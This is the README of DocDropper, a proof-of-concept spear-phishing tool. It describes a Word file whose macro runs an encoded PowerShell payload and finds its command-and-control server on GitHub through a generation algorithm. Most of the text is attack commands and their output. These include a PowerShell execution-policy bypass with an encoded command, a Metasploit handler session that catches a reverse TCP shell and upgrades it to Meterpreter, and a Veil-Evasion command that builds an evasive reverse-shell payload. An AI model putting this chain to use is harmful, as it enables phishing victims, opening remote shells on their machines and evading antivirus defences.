# DocDropper
## Reboot Spear Phishing

DocDropper is a Proof Of Concept of a DOC file who run a payload like a meterpreter, empire, etc.

Indeed, DocDropper use a PowerShell Dynamic Generation Algorithm to find his C&C hosted on Github.com.

Begin by `./dropper/vector.payload.ps1` : this is the encoded payload in the active Macro.

## Miscellaneous

#### Debug mode

```
powershell.exe -ExecutionPolicy Bypass -encodedCommand ([Convert]::ToBase64String(([System.Text.Encoding]::Unicode.GetBytes((Get-Content ./vector.payload.ps1)))))
```

#### Cmd.exe to Meterpreter

```
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf exploit(handler) > set LHOST 192.168.0.21
LHOST => 192.168.0.21
msf exploit(handler) > exploit -j
[*] Exploit running as background job.

[*] Started reverse handler on 192.168.0.21:4444 
[*] Starting the payload handler...
msf exploit(handler) > [*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.0.19
[*] Command shell session 1 opened (192.168.0.21:4444 -> 192.168.0.19:59134) at 2015-10-29 22:35:53 +0100

msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Type           Information  Connection
  --  ----           -----------  ----------
  1   shell windows               192.168.0.21:4444 -> 192.168.0.19:59134 (192.168.0.19)

msf exploit(handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse handler on 192.168.0.21:4433 
[*] Starting the payload handler...
[-] Powershell is not installed on the target.
[*] Command stager progress: 1.66% (1699/102108 bytes)
[*] Command stager progress: 3.33% (3398/102108 bytes)
[...]
[*] Command stager progress: 99.78% (101888/102108 bytes)
[*] Command stager progress: 100.00% (102108/102108 bytes)
```

#### Veil-Evasion Meterpreter

```
veil-evasion -p c/meterpreter/rev_tcp -c LHOST=192.168.0.21 LPORT=4444
```
